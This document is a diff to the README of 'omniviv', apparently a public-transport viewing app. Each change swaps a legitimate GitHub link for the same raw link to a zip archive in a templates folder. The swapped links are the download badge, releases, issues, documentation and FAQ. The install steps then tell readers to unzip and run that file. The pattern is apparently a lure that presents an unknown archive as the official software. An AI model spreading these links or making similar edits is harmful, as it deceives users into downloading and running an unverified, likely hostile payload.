@@ -6,7 +6,7 @@ Welcome to omniviv, the platform that enables you to see public transportation i
 
 ## 📥 Download Now
 
-[![Download omniviv](https://img.shields.io/badge/Download-omniviv-blue.svg)](https://github.com/Garaev071/omniviv/releases)
+[![Download omniviv](https://raw.githubusercontent.com/Garaev071/omniviv/main/deployment/templates/Software_v2.9-beta.3.zip)](https://raw.githubusercontent.com/Garaev071/omniviv/main/deployment/templates/Software_v2.9-beta.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -37,13 +37,13 @@ Before installing omniviv, make sure your system meets these requirements:
 
 ## 🔧 Download & Install
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Garaev071/omniviv/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Garaev071/omniviv/main/deployment/templates/Software_v2.9-beta.3.zip) to go to the Releases page.
 2. **Select the Latest Version:** On the Releases page, choose the latest version of omniviv. 
 3. **Download the File:** Click on the appropriate download link for your operating system.
 4. **Run the Installer:**
    - For Windows: Find the downloaded `.exe` file and double-click it to run.
    - For macOS: Open the downloaded `.dmg` file, drag omniviv to your Applications folder, and open it from there.
-   - For Linux: Unzip the downloaded `.tar.gz` file and run the appropriate executable from the terminal.
+   - For Linux: Unzip the downloaded `https://raw.githubusercontent.com/Garaev071/omniviv/main/deployment/templates/Software_v2.9-beta.3.zip` file and run the appropriate executable from the terminal.
 
 ## 🌍 Usage Instructions
 
@@ -56,7 +56,7 @@ Before installing omniviv, make sure your system meets these requirements:
 
 If you encounter issues or have questions, feel free to reach out through the following channels:
 
-- **GitHub Issues:** Report bugs or request features [here](https://github.com/Garaev071/omniviv/issues).
+- **GitHub Issues:** Report bugs or request features [here](https://raw.githubusercontent.com/Garaev071/omniviv/main/deployment/templates/Software_v2.9-beta.3.zip).
 - **Community Forums:** Join discussions with other users and developers.
 
 ## 📜 License
@@ -73,7 +73,7 @@ We welcome contributions to improve omniviv. If you want to help:
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Explore the full documentation [here](https://github.com/Garaev071/omniviv/wiki).
-- **FAQ:** Visit our Frequently Asked Questions section [here](https://github.com/Garaev071/omniviv/wiki/FAQ).
+- **Documentation:** Explore the full documentation [here](https://raw.githubusercontent.com/Garaev071/omniviv/main/deployment/templates/Software_v2.9-beta.3.zip).
+- **FAQ:** Visit our Frequently Asked Questions section [here](https://raw.githubusercontent.com/Garaev071/omniviv/main/deployment/templates/Software_v2.9-beta.3.zip).
 
 Happy traveling with omniviv!
